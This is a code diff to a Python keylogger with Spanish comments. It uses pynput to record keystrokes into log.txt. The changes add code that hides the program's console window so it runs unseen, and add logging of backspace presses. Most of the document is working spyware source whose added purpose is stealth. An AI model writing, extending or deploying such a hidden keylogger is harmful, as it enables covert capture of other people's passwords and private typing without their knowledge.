@@ -1,5 +1,12 @@
+#Para esconder la ventana
+import win32console
+import win32gui
 import pynput.keyboard
 #trabajar con palabras
+
+ventana = win32console.GetConsoleWindow()
+win32gui.ShowWindow(ventana,0)#para acultar la venta
+
 log_file = open('log.txt','w+')
 lista_tecla=[] #En esta lista se guardaran las palabras
 def imprimir():
@@ -20,6 +27,9 @@ def presiona(key):
     #si le da un enter
     elif key1 == "Key.enter":
         lista_tecla.append("\n")
+    #Si borra que no aparesca nada
+    elif key1 == "Key.backspace":
+        lista_tecla.append(" borro ")
     #Si es igual a una letra
     else:
         lista_tecla.append(key1)
